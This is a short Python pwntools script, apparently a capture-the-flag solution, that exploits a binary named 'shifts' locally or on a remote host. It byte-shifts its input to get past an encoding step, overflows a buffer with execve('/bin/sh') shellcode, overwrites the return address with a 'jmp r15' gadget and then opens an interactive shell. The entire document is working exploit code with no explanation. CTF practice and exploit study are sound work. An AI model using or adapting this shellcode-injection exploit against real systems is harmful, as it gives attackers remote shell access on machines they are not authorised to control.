import sys
from pwn import *

if args.REMOTE:
	r = remote("jh2i.com", 50015)
else:
	r = process("./shifts")
pause()

def x(i):
	return i-0xd if i >= 0xd else i+0x100-0xd
def p(s):
	return "".join([chr(x(ord(i))) for i in s[:0x40]])+s[0x40:]

def encrypt(s):
	r.sendlineafter("> ", "1")
	if len(s) >= 0x60-1:
		r.sendafter(": ", p(s[:0x5f]))
	else:
		r.sendlineafter(": ", p(s))

# execve("/bin/sh", 0, 0) shellcode
sc = "\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x54\x5f\xb0\x3b\x0f\x05"
encrypt(sc.ljust(0x58, '\x41')+p64(0x00000000004011cd).decode("Latin-1")) # jmp r15 gadget
r.interactive()
